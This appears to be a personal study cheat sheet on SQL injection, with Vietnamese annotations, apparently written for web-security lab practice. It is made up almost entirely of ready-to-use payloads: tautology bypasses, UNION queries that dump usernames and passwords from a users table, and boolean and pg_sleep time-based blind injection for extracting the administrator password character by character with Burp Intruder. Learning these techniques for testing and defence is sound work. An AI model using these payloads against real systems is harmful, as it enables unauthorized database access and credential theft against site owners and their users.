# SQL Injection

## Simple attack

* SELECT * FROM products WHERE category = 'Gifts' AND released = 1 **'+OR+1=1--**

## Union attack

>Xác định số cột trả về*
* **'+UNION+SELECT+NULL,NULL--**

>Xác định cột có kiểu dữ liệu là char*
* **'+UNION+SELECT+'abcdef',NULL,NULL--**

>Trường hợp chỉ có 1 cột trả về kiểu char nhưng cần lấy giá trị của 2 cột => Nối giá trị*
* **'+UNION+SELECT+NULL,username||'~'||password+FROM+users--**

## Blind SQL Injection
>Dựa trên sự khác biệt trên resposne trả về*
* TrackingId=x **'+OR+1=1--**
* TrackingId=x **'+OR+1=2--**

* TrackingId=x **'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'--**
* TrackingId=x **'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+length(password)>1--**
* TrackingId=x **'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+substring(password,1,1)='§a§'--**
*Sử dụng công cụ Burp Intruder với option Cluster bomb.*

> Dựa trên thông báo lỗi trả về*

> Dựa trên thời gian delay của truy vấn*
* TrackingId=x **'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--**
* TrackingId=x **'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--**

* TrackingId=x **'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--**
* TrackingId=x **'%3BSELECT+CASE+WHEN+(username='administrator'+AND+length(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--**

## Links

[SQL Injection cheat](https://portswigger.net/web-security/sql-injection/cheat-sheet).